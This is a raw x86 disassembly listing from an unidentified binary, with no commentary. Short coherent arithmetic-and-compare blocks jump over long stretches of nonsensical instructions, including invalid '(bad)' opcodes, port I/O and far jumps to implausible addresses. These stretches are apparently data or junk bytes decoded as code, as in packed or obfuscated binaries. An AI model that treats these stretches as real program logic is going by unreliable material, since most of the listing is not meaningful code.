  403a86:	and    DWORD PTR ds:0x43381b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403a99
  403acb:	ss iret 
  403acd:	and    DWORD PTR [eax],esp
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403aef
  403ad7:	bound  esi,QWORD PTR [edi+0x32]
  403ada:	out    0xd3,eax
  403adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403add:	fcomip st,st(7)
  403adf:	push   es
  403ae0:	ror    DWORD PTR [edi+esi*2],1
  403ae3:	cmp    DWORD PTR [esi+0xff34d9c],ecx
  403ae9:	fnsave [esi]
  403aeb:	or     DWORD PTR [ecx-0x75],eax
  403aee:	cmp    BYTE PTR [edx-0x71],bh
  403af1:	cli    
  403af2:	dec    ebp
  403af3:	in     eax,0x49
  403af5:	pop    edi
  403af6:	xor    ah,dh
  403af8:	sub    ch,BYTE PTR [ebx]
  403afa:	jns    0x403ad9
  403afc:	not    BYTE PTR [ecx]
  403afe:	add    eax,DWORD PTR [edx+0x20799c4d]
  403b04:	dec    eax
  403b05:	cmp    BYTE PTR [edx+0x51],bl
  403b08:	mov    dh,dh
  403b0a:	xor    DWORD PTR [ebp+0x14],0xffffffe0
  403b0e:	adc    dh,BYTE PTR [edx-0x4c3e9bdd]
  403b14:	in     eax,0x75
  403b16:	test   eax,0x9c4686c9
  403b1b:	popf   
  403b1c:	dec    edi
  403b1d:	nop
  403b1e:	daa    
  403b1f:	cmp    eax,ebx
  403b21:	es sar BYTE PTR fs:[ecx+0x3c16daed],0xc6
  403b2a:	retf   0x4b9b
  403b2d:	push   ds
  403b2e:	add    BYTE PTR [ebp+0x3d7e3e66],cl
  403b34:	jp     0x403b82
  403b36:	jmp    0x51492ad5
  403b3b:	sub    al,0x80
  403b3d:	(bad)  
  403b3e:	(bad)  
  403b3f:	ja     0x403b1f
  403b41:	pop    esp
  403b42:	push   es
  403b43:	in     eax,0x72
  403b45:	xor    eax,0xec1a03ba
  403b4a:	lods   al,BYTE PTR ds:[esi]
  403b4b:	add    al,BYTE PTR [edi]
  403b4d:	out    dx,eax
  403b4e:	pop    esi
  403b4f:	lea    esp,[edx]
  403b51:	and    al,0xc1
  403b53:	pop    ds
  403b54:	cdq    
  403b55:	mov    eax,ds:0xf50f6719
  403b5a:	mov    ebp,DWORD PTR [edi-0x7c]
  403b5d:	adc    ah,BYTE PTR [edx+ebp*8-0x59f8f65]
  403b64:	mov    al,0x29
  403b66:	inc    ecx
  403b67:	cmp    DWORD PTR [ebp+0x1d],ebx
  403b6a:	ret    
  403b6b:	fdivr  DWORD PTR [eax]
  403b6d:	popa   
  403b6e:	sbb    eax,0xc4813e55
  403b73:	or     DWORD PTR [edi],0xe8debcb6
  403b79:	ss mov esp,gs
  403b7c:	retf   
  403b7d:	push   ebx
  403b7e:	test   ebx,eax
  403b80:	lahf   
  403b81:	imul   esp,DWORD PTR [esi-0x11348b94],0x11
  403b88:	mov    al,0x3d
  403b8a:	fsub   st(7),st
  403b8c:	jno    0x403bf4
  403b8e:	cs jbe 0x403b6c
  403b91:	inc    eax
  403b92:	cmp    al,0xac
  403b94:	and    ebx,edx
  403b96:	adc    al,0x33
  403b98:	shr    DWORD PTR [ebp+eiz*4+0x26cd366c],cl
  403b9f:	(bad)  
  403ba0:	repz fdivr QWORD PTR [ebp-0x11]
  403ba4:	cmp    eax,0x6958eaa8
  403ba9:	xchg   ebx,eax
  403baa:	(bad)  ds:0x378dd5a3
  403bb0:	icebp  
  403bb1:	int3   
  403bb2:	and    cl,BYTE PTR [eax+0x3967b720]
  403bb8:	sub    al,0xd6
  403bba:	shl    BYTE PTR [ebx],1
  403bbc:	test   dh,al
  403bbe:	rol    DWORD PTR [edx+esi*8-0x11aea9e],cl
  403bc5:	dec    eax
  403bc6:	ja     0x403c1f
  403bc8:	in     al,0xac
  403bca:	repz sbb DWORD PTR [ecx+edx*1+0x42312f31],0xe3995407
  403bd6:	ins    DWORD PTR es:[edi],dx
  403bd7:	cs stc 
  403bd9:	inc    edx
  403bda:	iret   
  403bdb:	sub    dl,BYTE PTR [ecx]
  403bdd:	add    BYTE PTR [ebx+0x53533099],dh
  403be3:	scas   eax,DWORD PTR es:[edi]
  403be4:	mov    eax,0xbac4c1c6
  403be9:	mov    ds:0xbf28983,eax
  403bee:	iret   
  403bef:	cdq    
  403bf0:	in     al,0xc7
  403bf2:	jo     0x403b87
  403bf4:	and    ebx,DWORD PTR [ecx]
  403bf6:	leave  
  403bf7:	jle    0x403c65
  403bf9:	loope  0x403c30
  403bfb:	enter  0xc5b1,0xaf
  403bff:	in     al,dx
  403c00:	lahf   
  403c01:	gs cld 
  403c03:	lahf   
  403c04:	aaa    
  403c05:	icebp  
  403c06:	fimul  WORD PTR [esi+esi*2-0x74]
  403c0a:	fadd   DWORD PTR [edx+eax*1]
  403c0d:	mov    esp,0xad58de43
  403c12:	sub    eax,0x9b79ab08
  403c17:	xchg   ebp,eax
  403c18:	push   cs
  403c19:	aam    0xf9
  403c1b:	fstp   QWORD PTR [ecx+0x11]
  403c1e:	pop    edx
  403c1f:	aad    0xd7
  403c21:	adc    DWORD PTR [edi],edi
  403c23:	(bad)  
  403c25:	ds cmc 
  403c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c28:	loop   0x403bad
  403c2a:	pop    edi
  403c2b:	call   FWORD PTR [edi+0x3]
  403c2e:	mov    BYTE PTR [ecx],bl
  403c30:	or     bh,BYTE PTR [eax+eax*4-0xb89cdd7]
  403c37:	inc    edx
  403c38:	sbb    al,0xcc
  403c3a:	xor    ecx,DWORD PTR [ebp+0x8]
  403c3d:	push   cs
  403c3e:	hlt    
  403c3f:	and    cl,bh
  403c41:	mov    edi,0x9afe8642
  403c46:	int3   
  403c47:	pop    eax
  403c48:	icebp  
  403c49:	push   ebx
  403c4a:	stc    
  403c4b:	dec    eax
  403c4c:	lock xor eax,0xf3254b03
  403c52:	call   0xced510cd
  403c57:	ret    0x3163
  403c5a:	cli    
  403c5b:	pusha  
  403c5c:	sub    DWORD PTR [edi+0x28],esi
  403c5f:	add    DWORD PTR [ecx+ebp*8-0x7c],0xffffffa7
  403c64:	pop    edx
  403c65:	fistp  QWORD PTR [edi]
  403c67:	push   0xffffffc3
  403c69:	addr16 pop ecx
  403c6b:	test   DWORD PTR [edx],eax
  403c6d:	or     DWORD PTR [ecx],edx
  403c6f:	imul   ebx,eax,0x30848818
  403c75:	add    eax,0x2189efe
  403c7a:	add    BYTE PTR [edi+0x22],0x2f
  403c7e:	and    BYTE PTR [ebx+ebx*1-0x1a],dl
  403c82:	test   al,0x62
  403c84:	cmp    ebx,esp
  403c86:	mov    esi,0xdcd99eb2
  403c8b:	fadd   QWORD PTR [ecx+0x492391d9]
  403c91:	sub    eax,0xf8d404a3
  403c96:	(bad)  
  403c98:	mov    esi,DWORD PTR [eax+ebp*2-0x55]
  403c9c:	std    
  403c9d:	fnstcw WORD PTR [edx]
  403c9f:	aaa    
  403ca0:	stos   BYTE PTR es:[edi],al
  403ca1:	ins    BYTE PTR es:[edi],dx
  403ca2:	and    ah,BYTE PTR [ebx-0x61]
  403ca5:	mov    DWORD PTR [esi-0x43],ecx
  403ca8:	push   edx
  403ca9:	outs   dx,BYTE PTR ds:[esi]
  403caa:	sub    esi,DWORD PTR [ecx-0xd28e284]
  403cb0:	out    0xb3,al
  403cb2:	add    eax,0x3b559877
  403cb7:	xchg   ebx,eax
  403cb8:	loopne 0x403cdb
  403cba:	sub    cl,BYTE PTR [ebp+0x1f]
  403cbd:	fidivr DWORD PTR [edx+0x6e2d1ce2]
  403cc3:	and    DWORD PTR [edx+0x353993b4],edi
  403cc9:	dec    esi
  403cca:	cmp    ebx,DWORD PTR [ebx]
  403ccc:	mov    cl,0x3e
  403cce:	sub    DWORD PTR [ecx-0x64a63f6e],ecx
  403cd4:	mov    al,0x67
  403cd6:	jg     0x403c7f
  403cd8:	xchg   edi,eax
  403cd9:	sahf   
  403cda:	test   eax,0xa12afb10
  403cdf:	and    eax,0x274b2bc8
  403ce4:	dec    ebx
  403ce5:	popf   
  403ce6:	xchg   esi,eax
  403ce7:	out    dx,al
  403ce8:	adc    BYTE PTR [ebp+0x4f],0x42
  403cec:	or     dl,cl
  403cee:	pop    esp
  403cef:	inc    esi
  403cf0:	add    al,0x9e
  403cf2:	addr16 out 0x87,al
  403cf5:	out    dx,eax
  403cf6:	mov    ch,0x48
  403cf8:	sbb    eax,0x7bbf32e7
  403cfd:	push   es
  403cfe:	push   0x10
  403d00:	gs out dx,eax
  403d02:	pop    ds
  403d03:	pop    es
  403d04:	jg     0x403cf0
  403d06:	in     al,0x1c
  403d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d09:	icebp  
  403d0a:	je     0x403d85
  403d0c:	dec    ebx
  403d0d:	mov    bh,0x4d
  403d0f:	call   0xaae97afc
  403d14:	dec    edx
  403d15:	cmc    
  403d16:	sub    al,0x31
  403d18:	adc    DWORD PTR [ebx+0x76],esp
  403d1b:	xchg   esi,eax
  403d1c:	dec    eax
  403d1d:	jmp    ebp
  403d1f:	add    eax,0xa39679c8
  403d24:	pop    edi
  403d25:	test   al,0xa0
  403d27:	xor    esi,esi
  403d29:	push   eax
  403d2a:	add    al,0xdc
  403d2c:	adc    esi,esi
  403d2e:	and    ch,BYTE PTR [edx]
  403d30:	or     ebp,DWORD PTR [esi]
  403d32:	adc    BYTE PTR [esi],bh
  403d34:	movsx  ebp,dx
  403d37:	pop    ebx
  403d38:	test   BYTE PTR [esi+eax*2],ch
  403d3b:	fs xchg edx,eax
  403d3d:	stos   DWORD PTR es:[edi],eax
  403d3e:	mov    edi,0xd60414e9
  403d43:	xor    BYTE PTR [eax+0x3858e268],0x24
  403d4a:	cmp    cl,0xaa
  403d4d:	popa   
  403d4e:	scas   eax,DWORD PTR es:[edi]
  403d4f:	add    ebx,DWORD PTR [ebx+0x64f51da7]
  403d55:	ja     0x403d7e
  403d57:	mov    esi,0x7b6a2ec3
  403d5c:	inc    esp
  403d5d:	(bad)  
  403d5e:	jae    0x403d82
  403d60:	sbb    al,0x3a
  403d62:	inc    esp
  403d63:	cmp    ebx,ebp
  403d65:	xor    BYTE PTR ds:0xff99cd5,dh
  403d6b:	sbb    dl,BYTE PTR [ecx+0x39b32711]
  403d71:	mov    bh,0x17
  403d73:	cmp    ebp,0xffffff95
  403d76:	push   edx
  403d77:	cmp    DWORD PTR [edi+0x2d],0xc8fb2075
  403d7e:	adc    bh,al
  403d80:	dec    ecx
  403d81:	pop    es
  403d82:	or     dh,BYTE PTR [esi-0x6d996ad5]
  403d88:	jns    0x403d3a
  403d8a:	push   ecx
  403d8b:	adc    eax,0x55fc7e26
  403d90:	xor    al,0x8a
  403d92:	mov    esi,esp
  403d94:	repz push eax
  403d96:	xor    BYTE PTR [edx],dl
  403d98:	in     eax,dx
  403d99:	dec    edi
  403d9a:	xchg   BYTE PTR [ebp-0x29b70266],cl
  403da0:	push   ds
  403da1:	adc    esi,DWORD PTR [eax+ebx*2]
  403da4:	xor    esp,DWORD PTR [ecx+ebp*1+0x2d]
  403da8:	rcl    BYTE PTR [edx-0x4],0xb0
  403dac:	jmp    0xbf8435e0
  403db1:	out    dx,eax
  403db2:	xchg   esi,eax
  403db3:	shr    BYTE PTR [esp+edx*1-0x10],cl
  403db7:	xor    DWORD PTR [edx+0x1d],ecx
  403dba:	cmp    eax,0xf05d8b4f
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffb9
  403e75:	nop
  403e76:	cdq    
  403e77:	xchg   edx,eax
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e0b
  403e81:	jl     0x403ebb
  403e83:	rcl    bh,0x16
  403e86:	inc    eax
  403e87:	clc    
  403e88:	pushf  
  403e89:	mov    ebp,0xbada392
  403e8e:	cs jmp 0x42aebef9
  403e94:	or     ebx,ecx
  403e96:	add    al,0x6e
  403e98:	ds dec ebp
  403e9a:	scas   eax,DWORD PTR es:[edi]
  403e9b:	mov    eax,ds:0x3274c108
  403ea0:	ret    
  403ea1:	sbb    bh,al
  403ea3:	jns    0x403e8f
  403ea5:	ins    BYTE PTR es:[edi],dx
  403ea6:	sbb    eax,0x27723cd3
  403eab:	pushf  
  403eac:	repz cli 
  403eae:	mov    eax,ds:0x660ca047
  403eb3:	add    al,BYTE PTR [esi+0x2b]
  403eb6:	dec    edx
  403eb7:	jecxz  0x403ef8
  403eb9:	das    
  403eba:	nop
  403ebb:	pop    esi
  403ebc:	repz imul eax,eax,0xffffff90
  403ec0:	aaa    
  403ec1:	in     eax,0xa9
  403ec3:	jl     0x403e60
  403ec5:	pushf  
  403ec6:	jmp    0x1c61:0xe42dc565
  403ecd:	fucomi st,st(7)
  403ecf:	mov    cl,0x5c
  403ed1:	clc    
  403ed2:	inc    eax
  403ed3:	push   edi
  403ed4:	in     al,0x16
  403ed6:	jmp    0x403f19
  403ed8:	dec    ecx
  403ed9:	mov    al,0xa
  403edb:	in     eax,0xa5
  403edd:	mov    ecx,0xa0eebee1
  403ee2:	fnstsw WORD PTR ds:0x2c775fce
  403ee8:	pop    ds
  403ee9:	fisttp DWORD PTR [edx+0x33795ccd]
  403eef:	sar    ch,cl
  403ef1:	lea    esp,[esi]
  403ef3:	(bad)  
  403ef5:	fld    TBYTE PTR [edx-0x22f64506]
  403efb:	inc    esi
  403efc:	pushf  
  403efd:	mov    ch,0x7d
  403eff:	jmp    FWORD PTR [edx+0x5f]
  403f02:	cmp    DWORD PTR [edi-0x3a],esp
  403f05:	push   edi
  403f06:	mov    al,0x61
  403f08:	cmp    dl,ah
  403f0a:	inc    ebx
  403f0b:	js     0x403f14
  403f0d:	out    0xd0,al
  403f0f:	rcr    bh,cl
  403f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f12:	hlt    
  403f13:	adc    cl,BYTE PTR [ecx]
  403f15:	cmc    
  403f16:	jo     0x403ea6
  403f18:	fild   DWORD PTR [eax]
  403f1a:	xchg   BYTE PTR [edx-0x24],cl
  403f1d:	enter  0x7530,0x9f
  403f21:	jnp    0x403f05
  403f23:	call   DWORD PTR [edi-0x51]
  403f26:	push   cs
  403f27:	pop    eax
  403f28:	ins    DWORD PTR es:[edi],dx
  403f29:	fdiv   st,st(0)
  403f2b:	sar    DWORD PTR [ecx+0x3e],1
  403f2e:	mov    al,0x1f
  403f30:	aas    
  403f31:	ror    BYTE PTR [eax+0x2e],1
  403f34:	jmp    0x403f8c
  403f36:	sbb    esp,DWORD PTR [edi+ebp*4]
  403f39:	sub    DWORD PTR [ecx],edi
  403f3b:	mov    BYTE PTR [edi+0x3646f24f],dl
  403f41:	push   edi
  403f42:	jnp    0x403f1f
  403f44:	push   0x33
  403f46:	push   ecx
  403f47:	cmp    DWORD PTR [esi],ecx
  403f49:	push   edi
  403f4a:	ins    DWORD PTR es:[edi],dx
  403f4b:	(bad)  
  403f4c:	xor    al,0xc5
  403f4e:	(bad)  
  403f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f50:	mov    bh,0x16
  403f52:	pop    eax
  403f53:	add    eax,0x412c52d9
  403f58:	mov    al,0x8d
  403f5a:	pop    ss
  403f5b:	jp     0x403edd
  403f5d:	sub    BYTE PTR [ecx+eax*1+0x21],dl
  403f61:	dec    ecx
  403f62:	loope  0x403f4c
  403f64:	out    0xd,eax
  403f66:	in     al,dx
  403f67:	(bad)  [ebp-0x5edc112e]
  403f6d:	loop   0x403fce
  403f6f:	stos   BYTE PTR es:[edi],al
  403f70:	call   0xec1c912f
  403f75:	push   ss
  403f76:	mov    ds:0xc2d28c7d,al
  403f7b:	mov    cl,0x34
  403f7d:	fmul   QWORD PTR [ebx-0x63065195]
  403f83:	call   0xd1a4:0x5af84f8b
  403f8a:	adc    ch,BYTE PTR [ebx-0x69]
  403f8d:	js     0x403f80
  403f8f:	and    DWORD PTR [esp+edi*4],eax
  403f92:	push   edi
  403f93:	mov    dl,0xef
  403f95:	scas   eax,DWORD PTR es:[edi]
  403f96:	das    
  403f97:	and    ebp,ecx
  403f99:	xor    WORD PTR [ecx+ebp*2-0x7c0febcf],sp
  403fa1:	daa    
  403fa2:	out    dx,al
  403fa3:	mov    cs,WORD PTR [edx-0x37]
  403fa6:	les    ebx,FWORD PTR [ebp+0x7d]
  403fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403faa:	xchg   ecx,eax
  403fab:	jmp    0x1cfade7
  403fb0:	stos   BYTE PTR es:[edi],al
  403fb1:	inc    eax
  403fb2:	scas   eax,DWORD PTR es:[edi]
  403fb3:	jae    0x403fe0
  403fb5:	mov    al,BYTE PTR [eax+eax*4-0x2eb4cf06]
  403fbc:	aaa    
  403fbd:	adc    eax,0x5312c96b
  403fc2:	fldcw  WORD PTR [eax]
  403fc4:	popf   
  403fc5:	add    eax,0xa076d985
  403fca:	sub    eax,0x142524a7
  403fcf:	std    
  403fd0:	sub    al,0x97
  403fd2:	pop    ebp
  403fd3:	test   eax,0x48fc8b0a
  403fd8:	gs sbb eax,0x7c7d9804
  403fde:	xchg   edi,eax
  403fdf:	in     eax,dx
  403fe0:	popf   
  403fe1:	sbb    ecx,DWORD PTR [ecx]
  403fe3:	push   ebp
  403fe4:	fiadd  DWORD PTR [eax]
  403fe6:	mov    dl,0x69
  403fe8:	scas   al,BYTE PTR es:[edi]
  403fe9:	cmp    DWORD PTR [edi-0x63],eax
  403fec:	cmp    BYTE PTR [edi],al
  403fee:	jne    0x40404f
  403ff0:	(bad)  
  403ff1:	(bad)  
  403ff2:	fimul  WORD PTR [eax+eiz*1-0x7a]
  403ff6:	cmp    DWORD PTR [ebp+0x57991a31],edi
  403ffc:	mov    eax,0x40572ca1
  404001:	fild   QWORD PTR [edx-0x3f]
  404004:	mov    ch,0xae
  404006:	mov    bh,0x77
  404008:	or     BYTE PTR [ebx-0x1f90d319],0x89
  40400f:	ror    BYTE PTR [eax-0x60e9eb6b],0xf
  404016:	stos   DWORD PTR es:[edi],eax
  404017:	dec    edx
  404018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404019:	out    dx,al
  40401a:	dec    edi
  40401b:	or     BYTE PTR [ebx-0x39],0x11
  40401f:	pusha  
  404020:	xor    edx,ecx
  404022:	add    BYTE PTR [edx],ch
  404024:	dec    edx
  404025:	push   eax
  404026:	xchg   esp,eax
  404027:	hlt    
  404028:	xor    eax,0x29dddd10
  40402d:	es push 0xb
  404030:	mov    ah,0x6f
  404032:	repnz push ebp
  404034:	jae    0x403ffe
  404036:	stos   DWORD PTR es:[edi],eax
  404037:	xor    ecx,DWORD PTR [edx]
  404039:	imul   eax,DWORD PTR [ebp-0x7cd47467],0xffffff8e
  404040:	lods   eax,DWORD PTR ds:[esi]
  404041:	sub    cl,BYTE PTR [eax+0x4c]
  404044:	sub    esi,DWORD PTR [edx]
  404046:	fdivr  DWORD PTR [ebx]
  404048:	pop    es
  404049:	cmc    
  40404a:	scas   eax,DWORD PTR es:[edi]
  40404b:	mov    ah,0x3b
  40404d:	fadd   DWORD PTR [eax-0x3530e133]
  404053:	(bad)  
  404054:	fimul  DWORD PTR [eax+eiz*8-0x735abe41]
  40405b:	push   0x76
  40405d:	and    eax,0x94a5a639
  404062:	pusha  
  404063:	push   esi
  404064:	mov    al,0x5
  404066:	test   BYTE PTR [eax-0x4f],0x1b
  40406a:	mov    BYTE PTR [eax+0x54],ah
  40406d:	mov    al,0xab
  40406f:	xchg   ebx,eax
  404070:	fld    DWORD PTR [eax+0x3c]
  404073:	fwait
  404074:	mov    es,WORD PTR [ebp+0x4d]
  404077:	out    0x46,al
  404079:	arpl   WORD PTR [edi+0x15],cx
  40407c:	dec    ecx
  40407d:	clc    
  40407e:	lods   al,BYTE PTR ds:[esi]
  40407f:	daa    
  404080:	inc    edx
  404081:	xchg   edi,eax
  404082:	(bad)  
  404083:	fwait
  404084:	out    dx,eax
  404085:	in     al,dx
  404086:	pop    ss
  404087:	sbb    ebp,DWORD PTR [esp+edi*8-0x20]
  40408b:	popf   
  40408c:	out    0x9d,eax
  40408e:	dec    esp
  40408f:	xchg   BYTE PTR cs:[esi+eax*2+0x72b0aeae],dl
  404097:	jo     0x404048
  404099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40409a:	cmc    
  40409b:	icebp  
  40409c:	popf   
  40409d:	sbb    ah,BYTE PTR [bp+di+0xce1]
  4040a2:	fwait
  4040a3:	jl     0x40410b
  4040a5:	pusha  
  4040a6:	sbb    DWORD PTR [esi],ebx
  4040a8:	mov    bl,0xf7
  4040aa:	dec    edi
  4040ab:	or     al,0x9a
  4040ad:	popf   
  4040ae:	jmp    0xb35a:0x2db61e88
  4040b5:	push   0xffffffd1
  4040b7:	mov    edi,0xdf1db1f7
  4040bc:	push   eax
  4040bd:	shl    BYTE PTR [edi+0x6a],0x64
  4040c1:	mov    dh,0xb0
  4040c3:	ss xchg esi,eax
  4040c5:	pop    esp
  4040c6:	xor    bh,BYTE PTR [esi]
  4040c8:	in     al,0x71
  4040ca:	out    0xdb,al
  4040cc:	xchg   ebx,eax
  4040cd:	fld    DWORD PTR [ecx+0x76]
  4040d0:	push   ecx
  4040d1:	in     eax,0x31
  4040d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d4:	(bad)  
  4040d5:	adc    DWORD PTR [ecx+0x40],ebx
  4040d8:	ret    
  4040d9:	je     0x4040ec
  4040db:	sub    BYTE PTR [edi],bl
  4040dd:	push   0x1f
  4040df:	or     ch,BYTE PTR [eax]
  4040e1:	xchg   esp,eax
  4040e2:	sbb    ecx,DWORD PTR [eax]
  4040e4:	scas   al,BYTE PTR es:[edi]
  4040e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040e6:	push   cs
  4040e7:	sahf   
  4040e8:	repz inc edx
  4040ea:	mov    al,ds:0x9a8d7534
  4040ef:	sub    eax,0x82db1636
  4040f4:	arpl   WORD PTR [edi],dx
  4040f6:	fiadd  WORD PTR [esi-0x2c7f2f9a]
  4040fc:	xchg   DWORD PTR [eax],eax
  4040fe:	jo     0x4040e5
  404100:	repnz loop 0x404121
  404103:	and    eax,DWORD PTR [ebx]
  404105:	or     esi,DWORD PTR [eax+edi*4-0x74]
  404109:	and    DWORD PTR [edx],ebx
  40410b:	gs aaa 
  40410d:	fwait
  40410e:	ins    BYTE PTR es:[edi],dx
  40410f:	lods   eax,DWORD PTR ds:[esi]
  404110:	loopne 0x404137
  404112:	mov    DWORD PTR [esi+0x7f],ebx
  404115:	cli    
  404116:	loope  0x404166
  404118:	push   ebx
  404119:	leave  
  40411a:	clc    
  40411b:	xchg   DWORD PTR [ebp+0x68],ecx
  40411e:	neg    BYTE PTR [ebp-0x21]
  404121:	push   ebx
  404122:	aad    0xa0
  404124:	jl     0x404102
  404126:	cmp    ah,BYTE PTR [ecx+eiz*4-0x45d996f7]
  40412d:	jmp    0x404187
  40412f:	in     al,dx
  404130:	out    dx,al
  404131:	shr    DWORD PTR [esi],1
  404133:	push   ebp
  404134:	mov    esp,0x5a5944cf
  404139:	xchg   ebx,eax
  40413a:	les    esp,FWORD PTR [ecx-0x21]
  40413d:	sbb    eax,0x432f9844
  404142:	jge    0x4040cb
  404144:	mov    dh,0x70
  404146:	sub    ebp,esi
  404148:	out    0x36,eax
  40414a:	rcr    BYTE PTR [ebx+edi*4-0x1a],0xa
  40414f:	cmp    DWORD PTR [ecx+0x3d],edx
  404152:	jg     0x4040da
  404154:	aam    0x35
  404156:	test   al,0xa7
  404158:	aam    0xf2
  40415a:	in     eax,dx
  40415b:	aaa    
  40415c:	arpl   WORD PTR [edx],bx
  40415e:	jo     0x404123
  404160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404161:	jbe    0x4041a9
  404163:	int    0x4f
  404165:	ins    DWORD PTR es:[edi],dx
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [edx],ah
  40418b:	jo     0x404129
  40418d:	stos   DWORD PTR es:[edi],eax
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041e5
  404197:	inc    ebx
  404198:	mov    dl,0x77
  40419a:	mov    dl,0x67
  40419c:	in     al,dx
  40419d:	adc    dh,al
  40419f:	mov    bh,0xd5
  4041a1:	jb     0x4041c9
  4041a3:	sbb    DWORD PTR [eax+0x25],edi
  4041a6:	hlt    
  4041a7:	loope  0x4041c5
  4041a9:	dec    ecx
  4041aa:	inc    ebp
  4041ab:	test   BYTE PTR [eax],bl
  4041ad:	and    BYTE PTR [ecx],cl
  4041af:	mov    eax,ds:0x6f661d
  4041b4:	mov    cl,0xf4
  4041b6:	cs imul edi,ecx,0xffffffbd
  4041ba:	mov    BYTE PTR [edx+0x3f],ch
  4041bd:	dec    edi
  4041be:	jnp    0x4041d6
  4041c0:	enter  0x5cf9,0x86
  4041c4:	mov    bl,BYTE PTR [esi]
  4041c6:	es push cs
  4041c8:	inc    ebx
  4041c9:	fst    QWORD PTR [edx+0x3ad6f4d5]
  4041cf:	add    DWORD PTR [edi-0x7e],eax
  4041d2:	jnp    0x4041b8
  4041d4:	rcr    DWORD PTR [edi],0x77
  4041d7:	push   cs
  4041d8:	cmc    
  4041d9:	fisub  WORD PTR [ebp-0x77]
  4041dc:	xor    esp,eax
  4041de:	cmp    ebp,ebx
  4041e0:	les    edx,FWORD PTR [eax+edi*8-0x439903ea]
  4041e7:	push   ebx
  4041e8:	inc    ebx
  4041e9:	fild   QWORD PTR [eiz*8-0x47e45baa]
  4041f0:	inc    ebp
  4041f1:	inc    DWORD PTR [edx+eiz*4]
